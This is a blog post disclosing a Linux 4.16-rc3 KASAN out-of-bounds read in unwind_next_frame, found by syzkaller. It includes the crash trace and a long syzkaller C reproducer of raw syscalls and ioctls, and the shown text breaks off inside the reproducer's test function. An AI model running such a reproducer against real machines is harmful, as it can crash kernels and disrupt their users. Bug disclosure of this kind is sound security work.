---
layout: post
title: LK v4.16.x - unwind_next_frame- oobs
---

unwind_next_frame - alloca Out Of Bounds

posted & found by [zer0day](https://kozistr.github.io/)

## tl;dr

Got from syzkaller & Found in LK v4.16.0-rc3. But it's not useful info... As before, there's a similar bug what i found.
As committer said, this bug is absolutely natural and of course not useful stuff...

Other my posts including LK bugs & Stuffs in online aren't critical one :). Real things are in my offline stuffs :).

*link* : [unwind_orc-out_of_bounds](https://kozistr.github.io/2017/12/16/LK-unwind_orc-oob.html)

## Call Trace (Dump)

Here's a dump.

```c
[  163.982226] ==================================================================
[  163.984549] BUG: KASAN: alloca-out-of-bounds in unwind_next_frame+0x18a0/0x1920
[  163.986378] Read of size 8 at addr ffff88005a9878c0 by task poc/2752
[  163.987829] 
[  163.988229] CPU: 0 PID: 2752 Comm: poc Not tainted 4.16.0-rc3+ #6
[  163.989674] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  163.991730] Call Trace:
[  163.992180]  <IRQ>
[  163.992518]  dump_stack+0xd7/0x154
[  163.993118]  ? unwind_next_frame+0x18a0/0x1920
[  163.994093]  print_address_description+0x60/0x22b
[  163.995264]  ? unwind_next_frame+0x18a0/0x1920
[  163.996411]  kasan_report.cold.6+0xac/0x2f4
[  163.997455]  ? unwind_next_frame+0x18a0/0x1920
[  163.998528]  ? apic_timer_interrupt+0xf/0x20
[  163.999557]  ? deref_stack_reg+0xe0/0xe0
[  164.000293]  ? apic_timer_interrupt+0xf/0x20
[  164.001134]  ? __save_stack_trace+0x7d/0xf0
[  164.001962]  ? __memset+0x29/0x30
[  164.002616]  ? save_stack+0x32/0xb0
[  164.003298]  ? __kasan_slab_free+0x12c/0x170
[  164.004129]  ? kmem_cache_free+0xc1/0x300
[  164.004906]  ? rcu_process_callbacks+0x814/0x1dc0
[  164.005807]  ? __do_softirq+0x213/0x915
[  164.006545]  ? irq_exit+0x1a2/0x1d0
[  164.007272]  ? smp_apic_timer_interrupt+0xf1/0x500
[  164.008520]  ? apic_timer_interrupt+0xf/0x20
[  164.009794]  ? debug_check_no_locks_freed+0x210/0x210
[  164.011065]  ? debug_check_no_locks_freed+0x210/0x210
[  164.012342]  ? find_held_lock+0x33/0x1c0
[  164.013289]  ? mark_held_locks+0xc1/0x140
[  164.014098]  ? kmem_cache_free+0x152/0x300
[  164.014998]  ? __kasan_slab_free+0x12c/0x170
[  164.015695]  ? rcu_process_callbacks+0x814/0x1dc0
[  164.016483]  ? kmem_cache_free+0xc1/0x300
[  164.017174]  ? get_object+0x80/0x80
[  164.018026]  ? rcu_process_callbacks+0x814/0x1dc0
[  164.018974]  ? note_gp_changes+0x1e0/0x1e0
[  164.019836]  ? __do_softirq+0x213/0x915
[  164.020656]  ? irq_exit+0x1a2/0x1d0
[  164.021375]  ? smp_apic_timer_interrupt+0xf1/0x500
[  164.022346]  ? apic_timer_interrupt+0xf/0x20
[  164.023225]  </IRQ>
[  164.023716]  ? __memset+0x29/0x30
[  164.024397]  ? debug_check_no_locks_freed+0x210/0x210
[  164.025396]  ? kasan_unpoison_shadow+0x30/0x40
[  164.026288]  ? crypto_shash_update+0x24d/0x2a0
[  164.027278]  ? ext4_inode_csum.isra.60+0x2f1/0x8f0
[  164.028043]  ? ext4_journalled_zero_new_buffers+0x410/0x410
[  164.028987]  ? from_kprojid+0x89/0xc0
[  164.029601]  ? ext4_inode_csum_set+0x1ad/0x3c0
[  164.030653]  ? ext4_mark_iloc_dirty+0x1616/0x2a50
[  164.031704]  ? ext4_chunk_trans_blocks+0x20/0x20
[  164.032557]  ? __ext4_journal_get_write_access+0x143/0x200
[  164.033437]  ? ext4_mark_inode_dirty+0x204/0x890
[  164.034234]  ? ext4_rmdir+0x7e2/0xc10
[  164.035128]  ? ext4_expand_extra_isize+0x500/0x500
[  164.035921]  ? mark_held_locks+0xc1/0x140
[  164.036648]  ? timespec_trunc+0xea/0x180
[  164.037294]  ? current_kernel_time64+0x120/0x140
[  164.038016]  ? ext4_rmdir+0x7e2/0xc10
[  164.038616]  ? ext4_rename2+0x210/0x210
[  164.039262]  ? vfs_rmdir+0x24c/0x470
[  164.039917]  ? do_rmdir+0x364/0x420
[  164.040687]  ? user_path_create+0x40/0x40
[  164.041628]  ? _raw_spin_unlock_irq+0x24/0x40
[  164.042456]  ? _raw_spin_unlock_irq+0x24/0x40
[  164.043311]  ? task_work_run+0x113/0x1c0
[  164.044071]  ? do_syscall_64+0x43/0x6b0
[  164.044841]  ? SyS_mkdir+0x260/0x260
[  164.045598]  ? do_syscall_64+0x1b7/0x6b0
[  164.046418]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7
[  164.047648] 
[  164.047971] The buggy address belongs to the page:
[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0
[  164.050054] flags: 0x100000000000000()
[  164.050648] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff
[  164.051948] raw: 0000000000000000 ffffea00016a61e0 0000000000000000 0000000000000000
[  164.053383] page dumped because: kasan: bad access detected
[  164.054483] 
[  164.054732] Memory state around the buggy address:
[  164.055513]  ffff88005a987780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  164.056689]  ffff88005a987800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  164.058088] >ffff88005a987880: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00
[  164.059202]                                            ^
[  164.060069]  ffff88005a987900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  164.061549]  ffff88005a987980: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00
[  164.062649] ==================================================================
[  164.063841] Disabling lock debugging due to kernel taint

Message from syslogd@zer0day at Mar  3 16:44:33 ...
 kernel:[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0

Message from syslogd@zer0day at Mar  3 16:44:33 ...
 kernel:[  164.050054] flags: 0x100000000000000()
```

## PoC

Here's reproducible PoC code generated by syzkaller.

```c
#define _GNU_SOURCE 

#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <sys/mount.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <net/if_arp.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <linux/net.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

__attribute__((noreturn)) static void doexit(int status)
{
	volatile unsigned i;
	syscall(__NR_exit_group, status);
	for (i = 0;; i++) {
	}
}

#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

const int kFailStatus = 67;
const int kRetryStatus = 69;

static void fail(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);
}

static void exitf(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit(kRetryStatus);
}

static uint64_t current_time_ms()
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts))
		fail("clock_gettime failed");
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void use_temporary_dir()
{
	char tmpdir_template[] = "./syzkaller.XXXXXX";
	char* tmpdir = mkdtemp(tmpdir_template);
	if (!tmpdir)
		fail("failed to mkdtemp");
	if (chmod(tmpdir, 0777))
		fail("failed to chmod");
	if (chdir(tmpdir))
		fail("failed to chdir");
}

static void vsnprintf_check(char* str, size_t size, const char* format, va_list args)
{
	int rv;

	rv = vsnprintf(str, size, format, args);
	if (rv < 0)
		fail("tun: snprintf failed");
	if ((size_t)rv >= size)
		fail("tun: string '%s...' doesn't fit into buffer", str);
}

static void snprintf_check(char* str, size_t size, const char* format, ...)
{
	va_list args;

	va_start(args, format);
	vsnprintf_check(str, size, format, args);
	va_end(args);
}

#define COMMAND_MAX_LEN 128
#define PATH_PREFIX "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin "
#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)

static void execute_command(bool panic, const char* format, ...)
{
	va_list args;
	char command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];
	int rv;

	va_start(args, format);
	memcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);
	vsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);
	rv = system(command);
	if (panic && rv != 0)
		fail("tun: command \"%s\" failed with code %d", &command[0], rv);

	va_end(args);
}

static int tunfd = -1;
static int tun_frags_enabled;

#define SYZ_TUN_MAX_PACKET_SIZE 1000

#define TUN_IFACE "syz_tun"

#define LOCAL_MAC "aa:aa:aa:aa:aa:aa"
#define REMOTE_MAC "aa:aa:aa:aa:aa:bb"

#define LOCAL_IPV4 "172.20.20.170"
#define REMOTE_IPV4 "172.20.20.187"

#define LOCAL_IPV6 "fe80::aa"
#define REMOTE_IPV6 "fe80::bb"

#define IFF_NAPI 0x0010
#define IFF_NAPI_FRAGS 0x0020

static void initialize_tun(void)
{
	tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (tunfd == -1) {
		printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
		printf("otherwise fuzzing or reproducing might not work as intended\n");
		return;
	}
	const int kTunFd = 252;
	if (dup2(tunfd, kTunFd) < 0)
		fail("dup2(tunfd, kTunFd) failed");
	close(tunfd);
	tunfd = kTunFd;

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;
	if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
		ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
		if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)
			fail("tun: ioctl(TUNSETIFF) failed");
	}
	if (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)
		fail("tun: ioctl(TUNGETIFF) failed");
	tun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;

	execute_command(1, "sysctl -w net.ipv6.conf.%s.accept_dad=0", TUN_IFACE);

	execute_command(1, "sysctl -w net.ipv6.conf.%s.router_solicitations=0", TUN_IFACE);

	execute_command(1, "ip link set dev %s address %s", TUN_IFACE, LOCAL_MAC);
	execute_command(1, "ip addr add %s/24 dev %s", LOCAL_IPV4, TUN_IFACE);
	execute_command(1, "ip -6 addr add %s/120 dev %s", LOCAL_IPV6, TUN_IFACE);
	execute_command(1, "ip neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV4, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip -6 neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV6, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip link set dev %s up", TUN_IFACE);
}

#define DEV_IPV4 "172.20.20.%d"
#define DEV_IPV6 "fe80::%02hx"
#define DEV_MAC "aa:aa:aa:aa:aa:%02hx"

static void initialize_netdevices(void)
{
	unsigned i;
	const char* devtypes[] = {"ip6gretap", "bridge", "vcan", "bond", "veth"};
	const char* devnames[] = {"lo", "sit0", "bridge0", "vcan0", "tunl0",
				  "gre0", "gretap0", "ip_vti0", "ip6_vti0",
				  "ip6tnl0", "ip6gre0", "ip6gretap0",
				  "erspan0", "bond0", "veth0", "veth1"};

	for (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)
		execute_command(0, "ip link add dev %s0 type %s", devtypes[i], devtypes[i]);
	execute_command(0, "ip link add dev veth1 type veth");
	for (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {
		char addr[32];
		snprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);
		execute_command(0, "ip -4 addr add %s/24 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);
		execute_command(0, "ip -6 addr add %s/120 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);
		execute_command(0, "ip link set dev %s address %s", devnames[i], addr);
		execute_command(0, "ip link set dev %s up", devnames[i]);
	}
}

static int read_tun(char* data, int size)
{
	if (tunfd < 0)
		return -1;

	int rv = read(tunfd, data, size);
	if (rv < 0) {
		if (errno == EAGAIN)
			return -1;
		if (errno == EBADFD)
			return -1;
		fail("tun: read failed with %d", rv);
	}
	return rv;
}

static void flush_tun()
{
	char data[SYZ_TUN_MAX_PACKET_SIZE];
	while (read_tun(&data[0], sizeof(data)) != -1)
		;
}

static uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)
{
	int ptyno = 0;
	if (ioctl(a0, TIOCGPTN, &ptyno))
		return -1;
	char buf[128];
	sprintf(buf, "/dev/pts/%d", ptyno);
	return open(buf, a1, 0);
}

#define XT_TABLE_SIZE 1536
#define XT_MAX_ENTRIES 10

struct xt_counters {
	uint64_t pcnt, bcnt;
};

struct ipt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_entries;
	unsigned int size;
};

struct ipt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct ipt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct ipt_table_desc {
	const char* name;
	struct ipt_getinfo info;
	struct ipt_replace replace;
};

static struct ipt_table_desc ipv4_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

static struct ipt_table_desc ipv6_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

#define IPT_BASE_CTL 64
#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)
#define IPT_SO_GET_INFO (IPT_BASE_CTL)
#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)

struct arpt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_entries;
	unsigned int size;
};

struct arpt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct arpt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct arpt_table_desc {
	const char* name;
	struct arpt_getinfo info;
	struct arpt_replace replace;
};

static struct arpt_table_desc arpt_tables[] = {
    {.name = "filter"},
};

#define ARPT_BASE_CTL 96
#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)
#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)
#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)

static void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct ipt_get_entries entries;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(IPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(IPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct ipt_get_entries entries;
	struct ipt_getinfo info;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(IPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(IPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(IPT_SO_SET_REPLACE)");
	}
	close(fd);
}

static void checkpoint_arptables(void)
{
	struct arpt_get_entries entries;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(ARPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(ARPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_arptables()
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct arpt_get_entries entries;
	struct arpt_getinfo info;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(ARPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(ARPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(ARPT_SO_SET_REPLACE)");
	}
	close(fd);
}
#include <linux/if.h>
#include <linux/netfilter_bridge/ebtables.h>

struct ebt_table_desc {
	const char* name;
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
};

static struct ebt_table_desc ebt_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "broute"},
};

static void checkpoint_ebtables(void)
{
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(EBT_SO_GET_INIT_INFO)");
		}
		if (table->replace.entries_size > sizeof(table->entrytable))
			fail("table size is too large: %u", table->replace.entries_size);
		table->replace.num_counters = 0;
		table->replace.entries = table->entrytable;
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INIT_ENTRIES)");
	}
	close(fd);
}

static void reset_ebtables()
{
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
	socklen_t optlen;
	unsigned i, j, h;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		if (table->replace.valid_hooks == 0)
			continue;
		memset(&replace, 0, sizeof(replace));
		strcpy(replace.name, table->name);
		optlen = sizeof(replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INFO)");
		replace.num_counters = 0;
		for (h = 0; h < NF_BR_NUMHOOKS; h++)
			table->replace.hook_entry[h] = 0;
		if (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {
			memset(&entrytable, 0, sizeof(entrytable));
			replace.entries = entrytable;
			optlen = sizeof(replace) + replace.entries_size;
			if (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))
				fail("getsockopt(EBT_SO_GET_ENTRIES)");
			if (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)
				continue;
		}
		for (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {
			if (table->replace.valid_hooks & (1 << h)) {
				table->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;
				j++;
			}
		}
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))
			fail("setsockopt(EBT_SO_SET_ENTRIES)");
	}
	close(fd);
}

static void checkpoint_net_namespace(void)
{
	checkpoint_ebtables();
	checkpoint_arptables();
	checkpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	checkpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void reset_net_namespace(void)
{
	reset_ebtables();
	reset_arptables();
	reset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	reset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void remove_dir(const char* dir)
{
	DIR* dp;
	struct dirent* ep;
	int iter = 0;
retry:
	dp = opendir(dir);
	if (dp == NULL) {
		if (errno == EMFILE) {
			exitf("opendir(%s) failed due to NOFILE, exiting", dir);
		}
		exitf("opendir(%s) failed", dir);
	}
	while ((ep = readdir(dp))) {
		if (strcmp(ep->d_name, ".") == 0 || strcmp(ep->d_name, "..") == 0)
			continue;
		char filename[FILENAME_MAX];
		snprintf(filename, sizeof(filename), "%s/%s", dir, ep->d_name);
		struct stat st;
		if (lstat(filename, &st))
			exitf("lstat(%s) failed", filename);
		if (S_ISDIR(st.st_mode)) {
			remove_dir(filename);
			continue;
		}
		int i;
		for (i = 0;; i++) {
			if (unlink(filename) == 0)
				break;
			if (errno == EROFS) {
				break;
			}
			if (errno != EBUSY || i > 100)
				exitf("unlink(%s) failed", filename);
			if (umount2(filename, MNT_DETACH))
				exitf("umount(%s) failed", filename);
		}
	}
	closedir(dp);
	int i;
	for (i = 0;; i++) {
		if (rmdir(dir) == 0)
			break;
		if (i < 100) {
			if (errno == EROFS) {
				break;
			}
			if (errno == EBUSY) {
				if (umount2(dir, MNT_DETACH))
					exitf("umount(%s) failed", dir);
				continue;
			}
			if (errno == ENOTEMPTY) {
				if (iter < 100) {
					iter++;
					goto retry;
				}
			}
		}
		exitf("rmdir(%s) failed", dir);
	}
}

static void test();

void loop() {
	int iter;
	checkpoint_net_namespace();
	for (iter = 0;; iter++) {
		char cwdbuf[256];
		sprintf(cwdbuf, "./%d", iter);
		if (mkdir(cwdbuf, 0777))
			fail("failed to mkdir");
		int pid = fork();
		if (pid < 0)
			fail("loop fork failed");
		if (pid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
			setpgrp();
			if (chdir(cwdbuf))
				fail("failed to chdir");
			flush_tun();
			test();
			doexit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			int res = waitpid(-1, &status, __WALL | WNOHANG);
			if (res == pid)
				break;
			usleep(1000);
			if (current_time_ms() - start > 5 * 1000) {
				kill(-pid, SIGKILL);
				kill(pid, SIGKILL);
				while (waitpid(-1, &status, __WALL) != pid) {
				}
				break;
			}
		}
		remove_dir(cwdbuf);
		reset_net_namespace();
	}
}

uint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};
void test()
{
	long res;memcpy((void*)0x20000280, "/dev/loop-control", 18);
	syscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);
	*(uint64_t*)0x20000180 = 0;
	*(uint64_t*)0x20000188 = 0;
	*(uint64_t*)0x20000190 = 0;
	*(uint64_t*)0x20000198 = 0;
	syscall(__NR_timer_settime, 0, 0, 0x20000180, 0);
	*(uint64_t*)0x20000500 = 0x77359400;
	*(uint64_t*)0x20000508 = 0;
	*(uint64_t*)0x20000510 = 0;
	*(uint64_t*)0x20000518 = 0x989680;
	syscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);
	res = syz_open_pts(-1, 0x42100);
	if (res != -1)
		r[0] = res;
	syscall(__NR_ioctl, r[0], 0x5462, 0x20000140);
	syscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);
	res = syscall(__NR_pipe2, 0x20000000, 0);
	if (res != -1) {
		r[1] = *(uint32_t*)0x20000000;
		r[2] = *(uint32_t*)0x20000004;
	}
	*(uint16_t*)0x20000040 = -1;
	*(uint16_t*)0x20000042 = 0x200;
	*(uint16_t*)0x20000044 = 0x8000;
	*(uint16_t*)0x20000046 = 0x3f;
	*(uint16_t*)0x20000048 = 0x22;
	*(uint16_t*)0x2000004a = 0x45f;
	syscall(__NR_ioctl, r[1], 0x560a, 0x20000040);
